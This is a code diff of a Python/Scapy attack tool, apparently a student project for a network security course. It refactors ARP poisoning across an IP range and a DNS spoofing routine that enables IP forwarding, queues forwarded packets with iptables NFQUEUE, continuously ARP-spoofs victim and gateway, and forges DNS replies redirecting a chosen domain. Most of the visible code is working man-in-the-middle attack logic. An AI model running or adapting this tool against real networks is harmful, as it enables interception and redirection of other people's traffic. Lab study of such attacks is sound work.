@@ -42,7 +42,6 @@ ATTACKS = {
 }
 
 
-
 # Set up argument parser for using arguments in the command line
 parser = argparse.ArgumentParser(
     prog="2IC80 tool",
@@ -56,7 +55,7 @@ def spoof(target_ip, spoof_ip, verbose=True):
 
     if verbose:
         print(getmacbyip(target_ip))
-    
+
     send(packet, verbose=False)
 
 
@@ -77,12 +76,13 @@ def ARPposioning():
 
     elif victimNumber == "m":
         IPrange = custom_input("What is the range of IP addresses? ")
-        IpToSpoof = custom_input("What is the IP address to spoof? ")
+        ipToSpoof = custom_input("What is the IP address to spoof? ")
+
         if "-" in IPrange:
             upperBoundary = IPrange.split("-")[1]
-            lowerBoundary = lowerBoundary = IPrange.split(".")[3].split("-")[0]
+            lowerBoundary = IPrange.split(".")[3].split("-")[0]
 
-            for i in range(int(lowerBoundary), int(upperBoundary)):
+            for i in range(int(lowerBoundary), int(upperBoundary) + 1):
                 ipVictim = (
                     IPrange.split(".")[0]
                     + "."
@@ -92,15 +92,9 @@ def ARPposioning():
                     + "."
                     + str(i)
                 )
-                macVictim = getmacbyip(ipVictim)
 
-                print(ipVictim)
-                arp = Ether() / ARP()
-                arp[Ether].src = mac_attacker
-                arp[ARP].hwsrc = mac_attacker
-                arp[ARP].psrc = ipToSpoof
-                arp[ARP].hwdst = macVictim
-                arp[ARP].pdst = ipVictim
+                spoof(ipVictim, ipToSpoof)
+
         else:
             print("Invalid input. Please try again.")
 
@@ -116,10 +110,9 @@ def ARPposioning():
 def DNSpoisoning():
     global dns_ip
     global dns_domain
-    
     # Make sure IP forwarding is enabled
     os.system("echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward")
-    
+
     # Set up iptables rule to trap outgoing packets in a queue
     os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
 
@@ -131,24 +124,36 @@ def DNSpoisoning():
         if dns_domain_valid:
             dns_domain = dns_domain_input
         else:
-            print("{warning}Please enter a valid domain (format: www.example.com){endc}".format(warning=bcolors.WARNING, endc=bcolors.ENDC))
-    
+            print(
+                "{warning}Please enter a valid domain (format: www.example.com){endc}".format(
+                    warning=bcolors.WARNING, endc=bcolors.ENDC
+                )
+            )
+
     # Ask for an IP to resolve the given domain to until a valid one is provided
     while not dns_ip:
-        dns_ip_input = custom_input('Enter the IP address to redirect the spoofed domain name to: ')
+        dns_ip_input = custom_input(
+            "Enter the IP address to redirect the spoofed domain name to: "
+        )
         dns_ip_parsed = parse_ip_input(dns_ip_input)
 
         if len(dns_ip_parsed) == 1:
             dns_ip = dns_ip_parsed[0]
         else:
-            print('{warning}Please fill in a single valid IP address, not a range or list.{endc}'.format(warning=bcolors.WARNING, endc=bcolors.ENDC))
+            print(
+                "{warning}Please fill in a single valid IP address, not a range or list.{endc}".format(
+                    warning=bcolors.WARNING, endc=bcolors.ENDC
+                )
+            )
 
     ip_victim = custom_input("Enter the IP of the victim u chose: ")
     ip_gate = custom_input("Enter the IP of the gateway (probably 10.0.2.1): ")
-    
+
     # Start up a thread spoofing every 4 seconds
     interval = 4
-    arp_spoof_thread = threading.Thread(target=arp_spoof_continuously, args=(ip_gate, ip_victim, interval))
+    arp_spoof_thread = threading.Thread(
+        target=arp_spoof_continuously, args=(ip_gate, ip_victim, interval)
+    )
     arp_spoof_thread.daemon = True
     arp_spoof_thread.start()
 
@@ -167,11 +172,13 @@ def DNSpoisoning():
         )
     )
 
+
 def arp_spoof_continuously(ip_gate, ip_victim, interval):
     while True:
         spoof(ip_gate, ip_victim, verbose=False)
         spoof(ip_victim, ip_gate, verbose=False)
         time.sleep(interval)
+
 
 def netfilter_queue():
     queue = netfilterqueue.NetfilterQueue()
@@ -214,7 +221,6 @@ def sniffing(dns_domain, ipVictim, ipGate, RUNINGTHREAD):
 def dns_reply(packet, dns_dom, ipVictim, ipGate):
     print(packet[DNSQR].qname, dns_dom)
     if packet[DNSQR].qname == dns_dom + "." and packet[IP].src == ipVictim:
-        print(1)
         # Construct the DNS packet
         # Construct the Ethernet header by looking at the sniffed packet
         eth = Ether(src=packet[Ether].dst, dst=packet[Ether].src)
@@ -492,10 +498,12 @@ def main():
         if choice == "e":
             # Remove potential IP tables redirect
             try:
-                os.system("iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 8080")
+                os.system(
+                    "iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 8080"
+                )
             except:
                 pass
-        
+
             try:
                 os.system("iptables -D FORWARD -j NFQUEUE --queue-num 0")
             except:
@@ -512,6 +520,7 @@ def main():
             mapAddresses()
         else:
             print("Invalid input. Please try again.\n")
+
 
 def custom_input(msg):
     inp = raw_input(msg + bcolors.OKCYAN)
